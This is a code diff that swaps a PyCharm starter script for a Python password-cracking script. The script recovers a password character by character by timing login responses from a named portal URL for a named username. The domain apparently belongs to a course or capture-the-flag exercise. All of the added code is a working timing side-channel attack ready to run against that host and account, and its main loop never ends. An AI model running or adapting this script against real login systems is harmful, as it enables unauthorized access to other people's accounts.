@@ -1,16 +1,31 @@
-# This is a sample Python script.
+import requests
+def try_password(url, username, password_guess, i):
+    data = {'username': username, 'password': password_guess}
+    response = requests.post(url, json=data)
+    json = response.json()
+    total_time = json['total_time']
+    if total_time > i + 1:
+        return True
+    else:
+        return False
 
-# Press Shift+F10 to execute it or replace it with your code.
-# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
+
+def find_password(url, username):
+    password = 'aaaaaaaaaaaaaaaaa'
+    characters = 'abcdefghijklmnopqrstuvwxyzæøåABCDEFGHIJKLMNOPQRSTUVWXYZÆØÅ0123456789!"#$%&\'()*+,-./:;<=>?@[\]^`{|}~'
+    final_password = ''
+    i = 0
+    while True:
+        for char in characters:
+            password = password[:i] + char + password[i+1:]
+            if try_password(url, username, password, i):
+                final_password += char
+                print(final_password)
+                break
+
+        i += 1
 
 
-def print_hi(name):
-    # Use a breakpoint in the code line below to debug your script.
-    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.
-
-
-# Press the green button in the gutter to run the script.
-if __name__ == '__main__':
-    print_hi('PyCharm')
-
-# See PyCharm help at https://www.jetbrains.com/help/pycharm/
+url = 'https://portal.regjeringen.uiaikt.no/login'
+username = 'jonas.dahl'
+find_password(url, username)
